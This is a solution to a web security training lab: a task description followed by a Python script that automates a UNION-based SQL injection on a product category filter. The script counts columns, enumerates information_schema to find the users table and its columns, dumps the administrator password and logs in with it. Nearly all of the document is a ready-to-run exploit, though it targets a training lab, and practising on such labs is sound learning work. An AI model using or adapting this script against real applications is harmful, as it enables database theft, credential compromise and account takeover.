# SQL injection attack, listing the database contents on non-Oracle databases

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>To solve the lab, log in as the `administrator` user.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: SQL injection attack, listing the database contents on non-Oracle databases
BASE_URL = "https://0aaa001a034ef36a84aee20c00f80093.web-security-academy.net/"
PATH = "/filter"
LOGIN_PATH = "/login"

# Construct Full URLs
TARGET_URL = BASE_URL + PATH
LOGIN_URL = BASE_URL + LOGIN_PATH

def get_num_columns(url):
    """
    Determines the number of columns in the query.
    """
    print(f"[*] Probing {url} for column count...")
    for i in range(1, 50):
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            print(f"\n[+] Found correct number of columns: {i}")
            return i
    return None

def get_text_columns(url, num_cols):
    """
    Identifies which columns are text-compatible.
    """
    print("[*] Identifying text-compatible columns...")
    text_cols = []
    for i in range(num_cols):
        nulls = ["NULL"] * num_cols
        nulls[i] = "'abc'"
        null_string = ", ".join(nulls)
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            text_cols.append(i)
            
    print(f"\n[+] Text columns found at indices: {text_cols}")
    return text_cols

def get_users_table(url, num_cols, txt_idx):
    """
    Finds the table name containing user data by querying information_schema.tables.
    """
    print("[*] Hunting for the 'users' table...")
    nulls = ["NULL"] * num_cols
    nulls[txt_idx[0]] = "table_name"
    null_string = ", ".join(nulls)
    
    # Payload: UNION SELECT table_name FROM information_schema.tables
    payload = {
        "category": f"' UNION SELECT {null_string} FROM information_schema.tables -- "
    }
    
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        # Logic: Find any table cell containing the word "users"
        users_table = soup.find(lambda tag: tag.name in ['th', 'td'] and "users" in tag.text)
        
        if users_table:
            print(f"[+] Found Users Table: {users_table.text}")
            return users_table.text
    
    print("[-] Could not find a table with 'users' in the name.")
    return None

def get_user_columns(url, num_cols, txt_idx, table_name):
    """
    Finds the specific column names for username and password in the users table.
    """
    print(f"[*] Mapping columns for table '{table_name}'...")
    nulls = ["NULL"] * num_cols
    nulls[txt_idx[0]] = "column_name"
    null_string = ", ".join(nulls)
    
    # Payload: UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'FoundTable'
    payload = {
        "category": f"' UNION SELECT {null_string} FROM information_schema.columns where table_name = '{table_name}' -- "
    }
    
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Logic: Find username column and password column separately
        user_col_tag = soup.find(lambda t: t.name in ['td', 'th'] and "user" in t.text)
        pass_col_tag = soup.find(lambda t: t.name in ['td', 'th'] and "pass" in t.text)

        if user_col_tag and pass_col_tag:
            print(f"[+] Found Columns: {user_col_tag.text}, {pass_col_tag.text}")
            return user_col_tag.text, pass_col_tag.text
            
    print("[-] Could not identify specific column names.")
    return None
        
def get_admin_creds(url, num_cols, txt_idx, table_name, col_names):
    """
    Dumps the actual data from the users table.
    """
    print("[*] Dumping administrator credentials...")
    nulls = ["NULL"] * num_cols
    # Map the found column names to the valid text injection points
    nulls[txt_idx[0]] = col_names[0] # Username column
    nulls[txt_idx[1]] = col_names[1] # Password column
    null_string = ", ".join(nulls)
    
    # Payload: UNION SELECT user_col, pass_col FROM users_table
    payload = {
        "category": f"' UNION SELECT {null_string} FROM {table_name} -- "
    }
    
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Logic: Find 'administrator', then grab the NEXT cell (password)
        admin_tag = soup.find(string="administrator")
        if admin_tag:
            password_tag = admin_tag.find_next('td')
            if password_tag:
                print(f"[+] Admin Password found: {password_tag.text}")
                return password_tag.text
    
    print("[-] Credentials not found.")
    return None

def login(url, adminpw):
    """
    Logs in using the retrieved credentials to confirm the exploit.
    """
    if not adminpw:
        print("[-] Skipping login: No password found.")
        return

    print("[-] Attempting to log in...")
    s = requests.Session()
    
    # 1. Get CSRF Token
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf"})
    
    if token_input:
        token = token_input['value']
        
        # 2. Post Credentials
        login_data = {
            "username": "administrator",
            "password": adminpw, # Typo Fixed Here
            "csrf": token
        }
        
        response = s.post(url, data=login_data)
        if "Log out" in response.text or response.status_code == 200:
             print("\n[SUCCESS] LOGGED IN AS ADMINISTRATOR!")
        else:
            print(f"[-] Login failed. Status: {response.status_code}")

# --- Main Execution ---
if __name__ == "__main__":
    column_num = get_num_columns(TARGET_URL)
    
    if column_num:
        txtcol_indices = get_text_columns(TARGET_URL, column_num)
        
        if txtcol_indices:
            users_table_info = get_users_table(TARGET_URL, column_num, txtcol_indices)
            
            if users_table_info:
                user_columns = get_user_columns(TARGET_URL, column_num, txtcol_indices, users_table_info)
                
                if user_columns:
                    admin_pw = get_admin_creds(TARGET_URL, column_num, txtcol_indices, users_table_info, user_columns)
                    
                    if admin_pw:
                        login(LOGIN_URL, admin_pw)
```